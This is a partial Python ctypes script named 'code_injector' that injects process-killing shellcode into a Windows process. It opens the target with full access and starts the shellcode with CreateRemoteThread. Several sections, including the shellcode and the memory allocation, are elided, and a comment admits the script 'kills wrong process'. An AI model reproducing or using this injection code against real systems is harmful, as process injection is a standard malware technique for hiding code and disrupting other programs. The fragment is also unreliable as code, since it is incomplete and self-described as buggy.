import sys
from ctypes import *
#Needs to be updated kills wrong process
# We set the EXECUTE access mask so shellcode will execute in block allocated #
...
if not sys.argv[1] or not sys.argv[2]:
	print("code_injector: <PID to Inject> <PID to Kill>")
	sys.exit(0)
...
# Get handle to injectable process #
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
	print("[!] Could not aquire a handle to PID: %s" % pid)
	sys.exit(0)
...
# Create remote thread and point entry to head of shellcode #
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
	print("[!] Failed to inject process killing shellcode. Exiting.")
	sys.exit(0)

print("[*] Remote thread created with thread ID of: 0x%08x" % thread_id.value)
print("[*] Process %s killed" % pid_to_kill)
